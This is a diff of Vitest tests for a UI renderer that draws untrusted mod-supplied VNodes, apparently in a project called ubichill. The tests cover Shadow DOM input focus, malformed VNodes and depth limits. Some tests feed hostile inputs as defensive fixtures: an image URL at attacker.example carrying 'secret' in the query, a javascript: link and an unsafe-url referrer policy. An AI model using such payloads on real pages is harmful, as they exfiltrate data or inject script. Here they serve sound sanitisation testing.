@@ -1,5 +1,5 @@
 // @vitest-environment jsdom
-import type { VNode } from '@ubichill/shared';
+import type { VNode, VNodeChild } from '@ubichill/shared';
 import { describe, expect, it, vi } from 'vitest';
 import { renderVNode } from './VNodeRenderer';
 
@@ -30,6 +30,71 @@ describe('VNodeRenderer: テキスト入力', () => {
         expect(input.value).toBe('lo fi');
         expect(document.activeElement).toBe(input);
         container.remove();
+    });
+});
+
+/** ModUIMount と同じく Shadow DOM の中に描く。 */
+function renderInShadow(vnode: VNode): { container: HTMLElement; shadow: ShadowRoot; dispose: () => void } {
+    const host = document.createElement('div');
+    document.body.appendChild(host);
+    const shadow = host.attachShadow({ mode: 'open' });
+    const container = document.createElement('div');
+    shadow.appendChild(container);
+    renderVNode(vnode, container, vi.fn());
+    return { container, shadow, dispose: () => host.remove() };
+}
+
+const field = (type: string, value: string, children: VNode['children'] = []): VNode => ({
+    type,
+    props: { value, onUbiInput: '__h0' },
+    children,
+});
+
+const options = ['a', 'b', 'c'].map((v): VNode => ({ type: 'option', props: { value: v }, children: [v] }));
+
+describe('VNodeRenderer: Shadow DOM の中の入力欄', () => {
+    it.each(['input', 'textarea'])(
+        'フォーカス中の <%s> は、Worker から遅れて届いた別の値で上書きしない（IME の変換を壊さない）',
+        (type) => {
+            const { container, shadow, dispose } = renderInShadow(field(type, 'l'));
+            const input = container.querySelector<HTMLInputElement | HTMLTextAreaElement>(type);
+            if (!input) throw new Error(`${type} がない`);
+            input.focus();
+            expect(shadow.activeElement).toBe(input);
+            input.value = 'lo fi';
+            // ユーザーが 'lo fi' まで打った後に、'lo' の時点の VNode が届く
+            renderVNode(field(type, 'lo'), container, vi.fn());
+            expect(input.value).toBe('lo fi');
+            dispose();
+        },
+    );
+
+    it.each(['input', 'textarea'])('フォーカスしていない <%s> には新しい値を反映する', (type) => {
+        const { container, dispose } = renderInShadow(field(type, 'first'));
+        const input = container.querySelector<HTMLInputElement | HTMLTextAreaElement>(type);
+        expect(input?.value).toBe('first');
+        renderVNode(field(type, 'second'), container, vi.fn());
+        expect(input?.value).toBe('second');
+        dispose();
+    });
+
+    it('<select> の value は初回から選択に反映し、変わったら選び直す', () => {
+        const { container, dispose } = renderInShadow(field('select', 'b', options));
+        const select = container.querySelector('select');
+        expect(select?.value).toBe('b');
+        renderVNode(field('select', 'c', options), container, vi.fn());
+        expect(select?.value).toBe('c');
+        dispose();
+    });
+
+    it('<select> を選び直した後、同じ value の VNode が来ても選択を戻さない', () => {
+        const { container, dispose } = renderInShadow(field('select', 'a', options));
+        const select = container.querySelector('select');
+        if (!select) throw new Error('select がない');
+        select.value = 'c';
+        renderVNode(field('select', 'a', options), container, vi.fn());
+        expect(select.value).toBe('c');
+        dispose();
     });
 });
 
@@ -94,6 +159,24 @@ describe('VNodeRenderer: mod から届いた値で Host を操作させない', 
         expect(a?.getAttribute('rel')).toBe('noopener noreferrer');
     });
 
+    it('画像は参照元を送らない（mod の referrerpolicy は使わず、src より前に no-referrer を付ける）', () => {
+        const setAttribute = vi.spyOn(Element.prototype, 'setAttribute');
+        const { container } = render(el('img', { src: 'https://e.x/a.png', referrerpolicy: 'unsafe-url' }));
+        const img = container.querySelector('img');
+        expect(img?.getAttribute('referrerpolicy')).toBe('no-referrer');
+        expect(img?.getAttribute('src')).toBe('https://e.x/a.png');
+        const order = setAttribute.mock.calls
+            .map(([name]) => name)
+            .filter((n) => n === 'src' || n === 'referrerpolicy');
+        expect(order).toEqual(['referrerpolicy', 'src']);
+        setAttribute.mockRestore();
+    });
+
+    it('外部の http の画像は読ませない', () => {
+        const { container } = render(el('img', { src: 'http://attacker.example/?d=secret' }));
+        expect(container.querySelector('img')?.hasAttribute('src')).toBe(false);
+    });
+
     it('javascript: のリンクは付けない', () => {
         const { container } = render(el('a', { href: 'javascript:alert(1)' }, ['x']));
         expect(container.querySelector('a')?.hasAttribute('href')).toBe(false);
@@ -112,5 +195,121 @@ describe('VNodeRenderer: mod から届いた値で Host を操作させない', 
     it('パスワード欄は描かない', () => {
         const { container } = render(el('input', { type: 'password', name: 'password' }));
         expect(container.querySelector('input')?.type).toBe('text');
+    });
+});
+
+/** mod は VNode を自由に作れる。型に合わない値も届く前提で描く。 */
+const untrusted = (value: unknown): VNode => value as VNode;
+
+/** `depth` 段の div の入れ子（再帰を使わずに作る）。一番内側に文字を置く。 */
+function nestedDivs(depth: number): VNode {
+    return Array.from({ length: depth - 1 }).reduce<VNode>(
+        (inner) => el('div', {}, [inner]),
+        el('div', {}, ['deepest']),
+    );
+}
+
+const depthOf = (root: Element): number => {
+    const walk = (node: Element, depth: number): number =>
+        Math.max(depth, ...Array.from(node.children).map((child) => walk(child, depth + 1)));
+    return walk(root, 0);
+};
+
+describe('VNodeRenderer: 型に合わない VNode でも例外を出さない', () => {
+    it.each([
+        ['props が null', { type: 'div', props: null, children: ['x'] }],
+        ['props が無い', { type: 'div', children: ['x'] }],
+        ['props が数値', { type: 'div', props: 7, children: ['x'] }],
+        ['props が配列', { type: 'div', props: ['a'], children: ['x'] }],
+    ])('%s なら属性なしで描く', (_, vnode) => {
+        const { container } = render(untrusted(vnode));
+        const div = container.querySelector('div');
+        expect(div?.textContent).toBe('x');
+        expect(div?.getAttributeNames().filter((name) => name !== 'style')).toEqual([]);
+    });
+
+    it('文字列にできない属性・スタイルの値（toString が関数でない）は捨て、ほかは残す', () => {
+        const { container } = render(
+            untrusted({
+                type: 'div',
+                props: { title: { toString: 1 }, id: 'kept', style: { color: { toString: 1 }, opacity: 0.5 } },
+                children: [],
+            }),
+        );
+        const div = container.querySelector('div');
+        expect(div?.hasAttribute('title')).toBe(false);
+        expect(div?.id).toBe('kept');
+        expect(div?.style.color).toBe('');
+        expect(div?.style.opacity).toBe('0.5');
+    });
+
+    it.each([
+        ['数値', 7],
+        ['文字列', 'abc'],
+        ['オブジェクト', { length: 3 }],
+        ['null', null],
+        ['無い', undefined],
+    ])('children が%sなら子なしで描く', (_, children) => {
+        const { container } = render(untrusted({ type: 'p', props: {}, children }));
+        expect(container.querySelector('p')?.childNodes).toHaveLength(0);
+    });
+
+    it('子の中の型の違う値（type の無いオブジェクト・数値の type）は描かずに兄弟は残す', () => {
+        const { container } = render(
+            untrusted({
+                type: 'ul',
+                props: {},
+                children: [{}, { type: 42 }, { type: 'li', props: {}, children: ['ok'] }],
+            }),
+        );
+        expect(container.querySelectorAll('li')).toHaveLength(1);
+        expect(container.textContent).toBe('ok');
+    });
+
+    it('Fragment の props・children が壊れていても描く', () => {
+        const { container } = render(untrusted({ type: 'ubichill:fragment', props: null, children: 3 }));
+        expect(container.childNodes).toHaveLength(0);
+        const nested = render(
+            untrusted({
+                type: 'div',
+                props: {},
+                children: [{ type: 'ubichill:fragment', props: null, children: null }, 'after'],
+            }),
+        );
+        expect(nested.container.textContent).toBe('after');
+    });
+
+    it('20000 段の入れ子は上限の深さで切り、浅い兄弟は残す', () => {
+        const { container } = render(el('section', {}, [nestedDivs(20_000), el('span', {}, ['sibling'])]));
+        const section = container.querySelector('section');
+        if (!section) throw new Error('section がない');
+        expect(depthOf(container)).toBeLessThanOrEqual(32);
+        expect(container.textContent).not.toContain('deepest');
+        expect(section.querySelector(':scope > span')?.textContent).toBe('sibling');
+    });
+
+    it('上限ちょうどの深さは描く', () => {
+        const { container } = render(nestedDivs(32));
+        expect(depthOf(container)).toBe(32);
+        expect(container.textContent).toBe('deepest');
+    });
+
+    it('20000 段の配列・Fragment の入れ子でも例外を出さない', () => {
+        const deepArray = Array.from({ length: 20_000 }).reduce<VNodeChild>((inner) => [inner], 'leaf');
+        const deepFragment = Array.from({ length: 20_000 }).reduce<VNodeChild>(
+            (inner) => ({ type: 'ubichill:fragment', props: {}, children: [inner] }),
+            'leaf',
+        );
+        expect(render(el('div', {}, [deepArray, 'tail'])).container.textContent).toBe('tail');
+        expect(render(el('div', {}, [deepFragment, 'tail'])).container.textContent).toBe('tail');
+    });
+
+    it('壊れた VNode の後に正しい VNode が来れば描き直せる', () => {
+        const container = document.createElement('div');
+        const sendAction = vi.fn();
+        renderVNode(untrusted({ type: 'div', props: null, children: 7 }), container, sendAction);
+        renderVNode(el('div', { title: 't' }, ['ok']), container, sendAction);
+        expect(container.querySelector('div')?.getAttribute('title')).toBe('t');
+        expect(container.textContent).toBe('ok');
     });
 });
